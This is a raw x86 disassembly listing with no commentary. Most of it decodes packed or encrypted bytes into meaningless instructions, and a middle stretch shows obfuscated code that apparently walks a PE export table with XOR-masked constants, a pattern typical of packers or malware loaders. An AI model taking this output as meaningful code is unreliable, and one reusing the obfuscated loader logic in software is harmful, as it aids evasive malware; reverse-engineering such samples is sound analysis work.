  4062e0:	daa    
  4062e1:	fs inc edi
  4062e3:	rcl    BYTE PTR [esi-0x68c3e200],0x92
  4062ea:	push   ax
  4062ec:	and    DWORD PTR es:[bx+si],edi
  4062f0:	call   ecx
  4062f2:	ret    0x73a
  4062f5:	lods   al,BYTE PTR ds:[esi]
  4062f6:	lahf   
  4062f7:	dec    ecx
  4062f8:	xor    al,0xbb
  4062fa:	sub    DWORD PTR [eax+0x4dea6be3],ebp
  406300:	sub    al,0xcb
  406302:	stos   DWORD PTR es:[edi],eax
  406303:	in     al,dx
  406304:	push   ebx
  406305:	cmp    eax,0xa2619534
  40630a:	loop   0x4062d8
  40630c:	xor    bh,0x5
  40630f:	aas    
  406310:	push   cs
  406311:	aad    0xb7
  406313:	xchg   ebp,eax
  406314:	mov    ebp,0x952218b8
  406319:	adc    eax,0x85353172
  40631e:	sub    al,0x45
  406320:	jl     0x40637d
  406322:	and    DWORD PTR [edi+eiz*8-0x66],ebx
  406326:	jmp    0xd0dd:0x17254e81
  40632d:	inc    esi
  40632e:	add    al,0xca
  406330:	out    dx,al
  406331:	pop    esi
  406332:	fst    QWORD PTR [edx]
  406334:	and    DWORD PTR [edi+0x1f],ecx
  406337:	push   esp
  406338:	clc    
  406339:	in     al,0x71
  40633b:	push   cs
  40633c:	mov    eax,0xccedb5a
  406341:	and    BYTE PTR [edx-0x7c026616],ah
  406347:	xor    BYTE PTR [edx],dl
  406349:	jbe    0x4062d5
  40634b:	scas   eax,DWORD PTR es:[edi]
  40634c:	loopne 0x40633b
  40634e:	lods   eax,DWORD PTR ds:[esi]
  40634f:	std    
  406350:	outs   dx,BYTE PTR ds:[esi]
  406351:	pop    edx
  406352:	cvtdq2ps xmm5,XMMWORD PTR [edx-0x1b]
  406356:	scas   eax,DWORD PTR es:[edi]
  406357:	inc    esi
  406358:	lock (bad) 
  40635a:	mov    eax,0x6f38ebad
  40635f:	xor    edx,0xffffffbb
  406362:	in     al,0xa6
  406364:	cmp    al,0x82
  406367:	lahf   
  406368:	xor    DWORD PTR [esi-0x31],esp
  40636b:	xor    ebx,DWORD PTR [ecx]
  40636d:	or     bh,BYTE PTR [ecx]
  40636f:	popa   
  406370:	mov    al,ds:0xb3ae91ac
  406375:	shl    DWORD PTR [esi],0x35
  406378:	xchg   BYTE PTR [ecx-0x6ce07e4b],bl
  40637e:	call   0xe3adb2a6
  406383:	xchg   esp,eax
  406384:	mul    DWORD PTR [edi+0x63]
  406387:	xor    BYTE PTR [eax+0x73],cl
  40638a:	adc    BYTE PTR [esi+0x7fd9e233],al
  406390:	jg     0x40635b
  406392:	xchg   edx,eax
  406393:	xor    DWORD PTR [edx],edx
  406395:	scas   eax,DWORD PTR es:[edi]
  406396:	arpl   WORD PTR [esi+0x7e03385b],bx
  40639c:	cs stc 
  40639e:	cmp    ebp,DWORD PTR [ecx]
  4063a0:	scas   al,BYTE PTR es:[edi]
  4063a1:	jg     0x40633c
  4063a3:	out    0x7b,eax
  4063a5:	mov    ebp,0xe0542bf3
  4063aa:	jp     0x4063c5
  4063ac:	call   0xbb291963
  4063b1:	push   es
  4063b2:	mov    al,ds:0x8aab1db5
  4063b7:	sbb    ebp,edx
  4063b9:	xchg   edi,eax
  4063ba:	ficom  DWORD PTR [edi+0xa2af1f8]
  4063c0:	jns    0x406407
  4063c2:	adc    BYTE PTR [ebx-0x6e76df49],dl
  4063c8:	mov    ecx,0x22ca06bd
  4063cd:	add    eax,eax
  4063cf:	sub    ch,BYTE PTR [ecx+0x32904813]
  4063d5:	xor    eax,0xa692a3a9
  4063da:	mov    cl,0xa4
  4063dc:	adc    BYTE PTR [eax-0x2af5415c],dl
  4063e2:	into   
  4063e3:	cmp    eax,DWORD PTR [edi-0x72f30683]
  4063e9:	in     al,dx
  4063ea:	out    0xd7,al
  4063ec:	sahf   
  4063ed:	int    0xa6
  4063ef:	adc    eax,0xee29a7be
  4063f4:	retf   
  4063f5:	pop    ss
  4063f6:	jne    0x406386
  4063f8:	inc    eax
  4063f9:	adc    BYTE PTR ss:[eax+0x704ad09a],ah
  406400:	leave  
  406401:	push   ds
  406402:	call   0x704b:0x2f535f09
  406409:	pop    es
  40640a:	ret    
  40640b:	and    BYTE PTR [ecx+0x19795470],dl
  406411:	push   edi
  406412:	es lods eax,DWORD PTR fs:[esi]
  406415:	xchg   esp,eax
  406416:	jbe    0x406482
  406418:	loope  0x40648c
  40641a:	adc    ah,BYTE PTR [ecx-0x4610432a]
  406420:	fsubr  st(1),st
  406422:	pop    ds
  406423:	bswap  ebx
  406425:	cmp    BYTE PTR [edx],cl
  406427:	mov    es,edi
  406429:	adc    BYTE PTR [ebx],dl
  40642b:	push   ds
  40642c:	mov    bh,0xa8
  40642e:	int3   
  40642f:	sahf   
  406430:	sub    ebx,DWORD PTR [ebx-0x6343a429]
  406436:	sbb    BYTE PTR [esi],cl
  406438:	jnp    0x406466
  40643a:	cmp    dl,dl
  40643c:	cmp    eax,0xb93657e0
  406441:	fistp  QWORD PTR [edx-0x6f]
  406444:	or     ebp,DWORD PTR [edi]
  406446:	mov    gs,WORD PTR ss:[esi]
  406449:	dec    eax
  40644a:	xchg   ebx,eax
  40644b:	add    edi,DWORD PTR [ebx]
  40644d:	jb     0x4063d0
  40644f:	fsub   QWORD PTR [edx+eax*8-0x3d]
  406453:	test   BYTE PTR [edi+edi*2],0x13
  406457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406458:	inc    DWORD PTR [eax+0x6712d0a]
  40645e:	and    eax,0xc8b86408
  406463:	retf   
  406464:	inc    eax
  406465:	aas    
  406466:	mov    eax,0xaf6961d2
  40646b:	retf   
  40646c:	xor    DWORD PTR [ebx-0x17cc349e],ecx
  406472:	sub    al,0x9c
  406474:	jmp    0x53fa8ec5
  406479:	cmp    ebp,0x19e9e6e
  40647f:	cdq    
  406480:	fsub   DWORD PTR [edi-0x7a]
  406483:	push   ebp
  406484:	sub    eax,0xfe73257e
  406489:	push   eax
  40648a:	cmp    cl,0x3
  40648d:	imul   ecx,DWORD PTR [ecx-0x52],0xd328e959
  406494:	push   ecx
  406495:	pop    edi
  406496:	mov    WORD PTR [eax],es
  406498:	retf   0xe7b1
  40649b:	sar    eax,cl
  40649d:	xchg   ebp,eax
  40649e:	data16 mov dh,0x57
  4064a1:	out    dx,al
  4064a2:	cdq    
  4064a3:	aas    
  4064a4:	test   eax,0x12081066
  4064a9:	ins    DWORD PTR es:[edi],dx
  4064aa:	es push ss
  4064ac:	scas   eax,DWORD PTR es:[edi]
  4064ad:	xor    al,0xcb
  4064af:	cmp    DWORD PTR [esi-0xe1f015a],edi
  4064b5:	xor    eax,0xf83ed051
  4064ba:	push   ss
  4064bb:	jge    0x4064d1
  4064bd:	js     0x4064f3
  4064bf:	int    0xee
  4064c1:	mov    eax,ebx
  4064c3:	pop    ss
  4064c4:	and    BYTE PTR [eax*4-0x3ce71315],dl
  4064cb:	ss stos DWORD PTR es:[edi],eax
  4064cd:	stos   BYTE PTR es:[edi],al
  4064ce:	jp     0x406515
  4064d0:	lahf   
  4064d1:	test   BYTE PTR ds:0xb0337af6,0xc5
  4064d8:	in     al,0xc6
  4064da:	pop    ds
  4064db:	jno    0x4064f7
  4064dd:	jns    0x40655c
  4064df:	xchg   ecx,eax
  4064e0:	dec    edi
  4064e1:	std    
  4064e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e3:	cmp    eax,0xd878760b
  4064e8:	push   ecx
  4064e9:	xor    DWORD PTR [edi],eax
  4064eb:	inc    esi
  4064ec:	mov    bh,0x8c
  4064ee:	inc    ecx
  4064ef:	dec    edi
  4064f0:	mov    esi,0xd5eabf0f
  4064f5:	(bad)  
  4064f7:	mov    dl,0xd7
  4064f9:	xchg   DWORD PTR [ecx-0x46a0956b],esi
  4064ff:	mov    al,ds:0xf12185e5
  406504:	imul   ecx,DWORD PTR [esi],0xd4d6c9a6
  40650a:	out    dx,eax
  40650b:	cmp    cl,BYTE PTR [ebx]
  40650d:	inc    edx
  40650e:	ror    BYTE PTR [edi],1
  406510:	loopne 0x406508
  406512:	inc    ebp
  406513:	sub    esp,DWORD PTR [ecx+0x13305f3f]
  406519:	mov    dl,0x45
  40651b:	inc    ebp
  40651c:	lods   eax,DWORD PTR ds:[esi]
  40651d:	sub    BYTE PTR ds:0xf70b3737,ch
  406523:	pop    ebp
  406524:	adc    BYTE PTR [ebx+0x48],dl
  406527:	add    al,0x96
  406529:	push   DWORD PTR [edi]
  40652b:	cdq    
  40652c:	loop   0x4064e3
  40652e:	mov    bl,BYTE PTR [eax-0x7a485df]
  406534:	sub    DWORD PTR [ebx-0x2cec89e9],0x73
  40653b:	cmp    bh,BYTE PTR [ebx+0x19]
  40653e:	jp     0x40658d
  406540:	dec    ebp
  406541:	ret    
  406542:	(bad)  
  406543:	sub    al,0x23
  406545:	mov    ebx,DWORD PTR [eax-0x566b876a]
  40654b:	test   ah,0x36
  40654e:	lods   eax,DWORD PTR ds:[esi]
  40654f:	lods   al,BYTE PTR ds:[esi]
  406550:	in     eax,0x47
  406552:	icebp  
  406553:	sbb    BYTE PTR [ebx+0x2b2abbeb],dl
  406559:	pushf  
  40655a:	call   0x7fff7b1f
  40655f:	pop    eax
  406560:	mov    ebx,0x7f0831cd
  406565:	in     al,dx
  406566:	mov    eax,0x727f766d
  40656b:	sub    ecx,DWORD PTR [edx+0x9]
  40656e:	pop    ebp
  40656f:	aad    0x3d
  406571:	jge    0x4065e7
  406573:	popa   
  406574:	cld    
  406575:	jnp    0x406584
  406577:	inc    ebx
  406578:	call   0x1cc5:0xeead2152
  40657f:	clc    
  406580:	mov    edi,0x6f68a247
  406585:	sar    BYTE PTR [edx+0x2c],cl
  406588:	ficom  WORD PTR [esi-0x17209a82]
  40658e:	inc    eax
  40658f:	arpl   WORD PTR [edi+0x6a],cx
  406592:	test   DWORD PTR [ebx],eax
  406594:	(bad)  
  406596:	pop    ebx
  406597:	fldenv [edi]
  406599:	xor    edi,DWORD PTR [edi+0x6e]
  40659c:	jp     0x4065f3
  40659e:	or     BYTE PTR [eax-0x678526d5],bh
  4065a4:	push   es
  4065a5:	mov    BYTE PTR ds:0x9f00402d,bh
  4065ab:	mov    dh,0xc3
  4065ad:	mov    DWORD PTR [ecx+ebp*8+0x6b9569e2],ebp
  4065b4:	dec    eax
  4065b5:	pusha  
  4065b6:	imul   esi,DWORD PTR [ebx+0x18ceef84],0x65d68bfe
  4065c0:	adc    eax,DWORD PTR ds:0x8e8577b4
  4065c6:	pop    esi
  4065c7:	int3   
  4065c8:	jl     0x406630
  4065ca:	xor    BYTE PTR [esi-0x1b],al
  4065cd:	ss or  eax,0x4a038fab
  4065d3:	adc    al,0x6b
  4065d5:	or     esi,DWORD PTR [edx+edx*2+0x21]
  4065d9:	out    0x5e,al
  4065db:	cwde   
  4065dc:	xchg   esi,eax
  4065dd:	clc    
  4065de:	retf   
  4065df:	scas   al,BYTE PTR es:[edi]
  4065e0:	(bad)  
  4065e2:	and    eax,0x4b5d24a7
  4065e7:	pop    DWORD PTR [ecx]
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d28c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x41ffef
  4066b7:	mov    edi,DWORD PTR ds:0x41d254
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x7e],0x8
  4069c2:	ss jmp 0x62a2a68a
  4069c8:	sub    bl,BYTE PTR [edi+0x62]
  4069cb:	bound  ebx,QWORD PTR [esi-0x7e]
  4069ce:	mov    ecx,0xb7ebb310
  4069d3:	push   0x88a2a63c
  4069d8:	addr16 xchg edi,eax
  4069da:	outs   dx,BYTE PTR cs:[esi]
  4069dc:	ret    0x22a9
  4069df:	bound  esp,QWORD PTR [edi-0x12]
  4069e2:	int    0xba
  4069e4:	sub    esi,DWORD PTR [ecx+0x1c6637a6]
  4069ea:	in     eax,0x5b
  4069ec:	es mov ch,0xd5
  4069ef:	jge    0x4069f7
  4069f1:	mov    DWORD PTR [ebx+0x101e0988],esp
  4069f7:	(bad)  
  4069f8:	stos   DWORD PTR es:[edi],eax
  4069f9:	call   0x238f474a
  4069fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069ff:	or     BYTE PTR [edi],dh
  406a01:	and    BYTE PTR [esi-0x75edbcba],bl
  406a07:	jae    0x4069a7
  406a09:	outs   dx,BYTE PTR ds:[esi]
  406a0a:	hlt    
  406a0b:	leave  
  406a0c:	cmp    eax,0xc4437571
  406a11:	js     0x4069ed
  406a13:	inc    edi
  406a14:	sub    bh,cl
  406a16:	add    al,0xae
  406a18:	inc    ebp
  406a19:	sub    eax,0x3233d25a
  406a1e:	sub    eax,0xc59d9cde
  406a23:	dec    edi
  406a24:	(bad)  
  406a25:	push   esi
  406a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a27:	rcr    al,0x64
  406a2a:	pop    edi
  406a2b:	aam    0x32
  406a2d:	nop
  406a2e:	(bad)  
  406a2f:	pop    edi
  406a30:	je     0x406aa1
  406a32:	out    0xe0,al
  406a34:	pop    edx
  406a35:	(bad)  
  406a36:	aad    0x43
  406a38:	pop    ss
  406a39:	pop    eax
  406a3a:	lock nop
  406a3c:	unpckhps xmm6,xmm4
  406a3f:	nop
  406a40:	in     eax,0xcd
  406a42:	dec    esi
  406a43:	sub    edx,DWORD PTR [esi+ecx*2]
  406a46:	test   BYTE PTR [edx+0x50],dh
  406a49:	push   edx
  406a4a:	dec    esp
  406a4b:	push   ebp
  406a4c:	jecxz  0x406a70
  406a4e:	pop    ebp
  406a4f:	loope  0x406a8f
  406a51:	dec    esp
  406a52:	icebp  
  406a53:	sub    esi,ebx
  406a55:	dec    ebp
  406a56:	xchg   ebx,eax
  406a57:	dec    esp
  406a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a59:	arpl   WORD PTR [edi-0x6e8ee3a],bp
  406a5f:	ror    DWORD PTR [ebp+edi*8+0x11],1
  406a63:	mov    ah,0xb6
  406a65:	push   ss
  406a66:	iret   
  406a67:	mov    ebx,esp
  406a69:	mov    ebx,0xc3c927d2
  406a6e:	sub    ecx,DWORD PTR [edx-0x62]
  406a71:	scas   al,BYTE PTR es:[edi]
  406a72:	mov    edi,0x97e2cdcd
  406a77:	jp     0x406a2b
  406a79:	push   ebx
  406a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a7b:	aad    0xdc
  406a7d:	cmp    DWORD PTR [edx-0x2839460f],edi
  406a83:	dec    esi
  406a84:	out    dx,al
  406a85:	inc    edx
  406a86:	mov    cl,0x86
  406a88:	cmp    BYTE PTR [ebp+0x3e67e4f6],bl
  406a8e:	ficom  WORD PTR [ecx-0x52]
  406a91:	popa   
  406a92:	pop    ss
  406a93:	shr    BYTE PTR [ebx-0x79556ac4],cl
  406a99:	add    dl,ch
  406a9b:	repnz inc edi
  406a9d:	fwait
  406a9e:	or     al,0xd0
  406aa0:	adc    DWORD PTR [ebp+0x6a1de2d7],esp
  406aa6:	xchg   BYTE PTR [edi-0x26e8cecf],ch
  406aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aad:	outs   dx,BYTE PTR ds:[esi]
  406aae:	xor    DWORD PTR [esi-0x24115f85],edi
  406ab4:	pop    ecx
  406ab5:	mov    edi,DWORD PTR [ebx-0x12]
  406ab8:	int3   
  406ab9:	sub    BYTE PTR [eax],dl
  406abb:	push   esi
  406abc:	sar    DWORD PTR [ebx-0x35133fab],0x81
  406ac3:	(bad)  
  406ac4:	jmp    0xac9e:0xfb246ab9
  406acb:	call   0xb5b6:0xbe2d4221
  406ad2:	imul   eax,DWORD PTR [eax],0xfc9eab0d
  406ad8:	adc    edi,DWORD PTR [edi+0x6fade38a]
  406ade:	mov    edx,0x1492be22
  406ae3:	stos   DWORD PTR es:[edi],eax
  406ae4:	je     0x406acb
  406ae6:	and    DWORD PTR [esi-0x3a],edx
  406ae9:	xchg   BYTE PTR [ebp+0x7da34651],dl
  406aef:	popf   
  406af0:	retf   0x8735
  406af3:	lahf   
  406af4:	scas   eax,DWORD PTR es:[edi]
  406af5:	stc    
  406af6:	je     0x406ae8
  406af8:	repnz imul edi,DWORD PTR [ecx*8+0x33fdeb07],0x8e126da4
  406b04:	xor    al,BYTE PTR [esi-0x6d]
  406b07:	daa    
  406b08:	addr16 fsubp st(3),st
  406b0b:	pop    esi
  406b0c:	push   eax
  406b0d:	loope  0x406aa5
  406b0f:	imul   ebx,edi,0x3a7a3957
  406b15:	ins    DWORD PTR es:[edi],dx
  406b16:	fwait
  406b17:	dec    al
  406b19:	xchg   ebx,eax
  406b1a:	ret    0xfefb
  406b1d:	xor    DWORD PTR [eax-0x13],0xffffffcd
  406b21:	retf   
  406b22:	pop    ebx
  406b23:	push   ss
  406b24:	(bad)  
  406b26:	in     al,dx
  406b27:	out    0x83,eax
  406b29:	push   eax
  406b2a:	dec    eax
  406b2b:	mov    ecx,0xac668a89
  406b30:	push   edi
  406b31:	ud0    edx,ecx
  406b34:	lods   eax,DWORD PTR ds:[esi]
  406b35:	push   esi
  406b36:	imul   edi,DWORD PTR [ebp-0x40],0xffffff96
  406b3a:	or     BYTE PTR [edx-0x24def1d5],ah
  406b40:	lahf   
  406b41:	pop    esi
  406b42:	jns    0x406b0f
  406b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b45:	and    al,0xff
  406b47:	or     bl,BYTE PTR [edi]
  406b49:	xor    BYTE PTR [ecx-0x61ce61bb],dl
  406b4f:	in     al,0x36
  406b51:	dec    ecx
  406b52:	dec    edi
  406b53:	int    0xe4
  406b55:	scas   al,BYTE PTR es:[edi]
  406b56:	mov    al,ds:0xf584d183
  406b5b:	xchg   ecx,ebp
  406b5d:	add    al,0x76
  406b5f:	(bad)  
  406b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b61:	xchg   BYTE PTR [ebx],ch
  406b63:	mov    edx,DWORD PTR [edi+0x37]
  406b66:	lock jecxz 0x406bd7
  406b69:	xchg   edx,eax
  406b6a:	mov    dl,0xe7
  406b6c:	mov    eax,ds:0xc535c657
  406b71:	scas   al,BYTE PTR es:[edi]
  406b72:	je     0x406b48
  406b74:	test   al,bl
  406b76:	popa   
  406b77:	sti    
  406b78:	mov    ebp,0x32a06692
  406b7d:	jecxz  0x406b1b
  406b7f:	es pop edi
  406b81:	xlat   BYTE PTR ds:[ebx]
  406b82:	jb     0x406bb8
  406b84:	xor    bl,bl
  406b86:	pop    ds
  406b87:	push   ebp
  406b88:	xchg   esi,eax
  406b89:	rcr    BYTE PTR [eax+eax*4+0x19],cl
  406b8d:	mov    bl,0x8c
  406b8f:	mov    DWORD PTR [ebx],edi
  406b91:	ds and eax,0xacb35ba0
  406b97:	push   edi
  406b98:	add    eax,0x22f5598d
  406b9d:	retf   0x557
  406ba0:	repnz aam 0x39
